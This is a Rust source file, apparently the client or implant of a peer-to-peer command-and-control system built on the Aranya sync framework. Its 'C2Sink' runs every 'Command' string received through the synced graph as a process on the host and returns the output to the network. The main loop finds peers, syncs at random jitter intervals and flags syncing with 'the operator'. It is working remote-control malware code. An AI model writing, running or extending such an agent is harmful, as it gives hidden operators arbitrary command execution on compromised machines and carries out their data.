mod common;
mod config;
mod policy;

use std::{
    net::{
        IpAddr,
        Ipv4Addr,
        SocketAddr,
    },
    rc::Rc,
    cell::RefCell,
    sync::Arc,
};
use aranya_policy_vm::{text, Text};
use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
use aranya_crypto::BaseId;
use tokio::time::{sleep, Duration};
use crate::policy::command_executed;
use tokio::sync::Mutex;

struct C2Sink {
    pub client: Option<Arc<Mutex<common::Client<C2Sink>>>>
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        if effect.name == "Command" {
            if let aranya_policy_vm::Value::String(s) = effect.fields[0].value() {
                print!("COMMAND:{}\n", s);
                let out = std::process::Command::new(s).output().expect("Error exec command");
                let stdout = String::from_utf8(out.stdout).expect("Output string fail");

                let clientr = &self.client.as_ref();

                if let Some(client) = clientr.cloned() {
                    tokio::spawn(async move {
                        let a: Text = stdout.try_into().expect("String to Text fail");
                        client.lock().await.do_action(vm_action!(command_executed(BaseId::default(), a))).await;
                    });
                }
            }
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt::init();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    let mut ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();
    
    // use rand::prelude::*;
    // let mut rng = rand::rng();

    
    // let randi = rng.random_range(0..ips.len());
    // let sync = ips[randi];


    // TODO: TEMPORARY
    use std::env;

    let args: Vec<String> = env::args().collect();

    let bind = args[1].parse().expect("IPv4 address in wrong format i.e. 127.0.0.1:1234");

    // let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT);

    
    use rand::prelude::SliceRandom;


    ips = Vec::new();
    ips.push("127.0.1.1".parse().unwrap());
    ips.push("127.0.1.2".parse().unwrap());
    ips.push("127.0.1.3".parse().unwrap());
    ips.push("127.0.1.4".parse().unwrap());
    ips.push("127.0.1.5".parse().unwrap());

    let mut rng = rand::rng();
    ips.shuffle(&mut rng);

    let mut subbedips: Vec<std::net::IpAddr> = Vec::new();

    // TODO: END TEMPORARY

    rt.block_on(async move {
        // Set up Aranya
        let mut aranya = common::Client::init(
            config::POLICY.to_string(),
            bind,
            C2Sink {
                client: None
            }
        ).unwrap();

        // Aranya Mutex I guess, maybe should be called Aranya Arc
        let aranyam = Arc::new(Mutex::new(aranya));
        
        // Setup the sink and print graph information
        {
            let aranyac = Arc::clone(&aranyam);
            let aranyal = &mut *aranyac.lock().await;

            Arc::clone(&aranyal.sink).lock().await.client
                = Some(Arc::clone(&aranyam));

            let graph = GraphId::decode(config::GRAPH).unwrap();
            aranyal.set_graph(graph);

            print!("Working on Graph ID `{}`\n", graph);
        }

        // Let the syncer start up (warm up the engines :) )
        sleep(Duration::from_millis(1000)).await;

        // Syncing logic loop
        loop {
            print!("{:?} | Loop start\n", bind);
            // Stall for a random amount of time
            use rand::prelude::*;
            sleep(Duration::from_millis(rand::random_range(1000..2000))).await;

            match ips.pop() {
                // Subscribe to predefined ip list
                Some(ip) => {
                    let aranyac = Arc::clone(&aranyam);
                    let aranyal = &mut *aranyac.lock().await;

                    if ip == bind.ip() {
                        continue
                    }

                    aranyal.subscribe_to(SocketAddr::new(ip, config::PORT)).await;

                    subbedips.push(ip);
                },
                // Start subscribing back to subscribers
                None => {
                    let aranyac = Arc::clone(&aranyam);
                    let aranyal = &mut *aranyac.lock().await;

                    // Get list of subscribers
                    let mut subs: Vec<std::net::IpAddr> = Vec::new();
                    {
                        let mut syncer = aranyal.syncer.lock().await;
                        for (&(addr, _sub_graph_id), subscription) in &syncer.subscriptions {
                            // No need to sub if already subbed
                            if subbedips.contains(&addr.ip()) {
                                continue
                            }
                            
                            subs.push(addr.ip());
                        }
                    }

                    // Subscribe to the first subscriber
                    match subs.pop() {
                        Some(sub) => {
                            aranyal.subscribe_to(SocketAddr::new(sub, config::PORT)).await;
                            subbedips.push(sub);
                        },
                        None => {}
                    };
                }
            };

            // Sync up with some nodes
            let aranyac = Arc::clone(&aranyam);
            let aranyal = &mut *aranyac.lock().await;

            aranyal.push_graph().await;

            use rand::seq::IndexedRandom;
            match subbedips.choose(&mut rand::rng()) {
                Some(ip) => {
                    // TODO: TEmp debug
                    if *ip == IpAddr::V4(Ipv4Addr::new(127, 0, 0, 2)) {
                        print!("I AM SYNCING WITH THE OPERATOR!!!\n");
                    }

                    aranyal.sync_with(SocketAddr::new(*ip, config::PORT)).await;
                },
                None => {}
            }

            print!("{:?} | Loop end\n", bind);
        }
    });
}
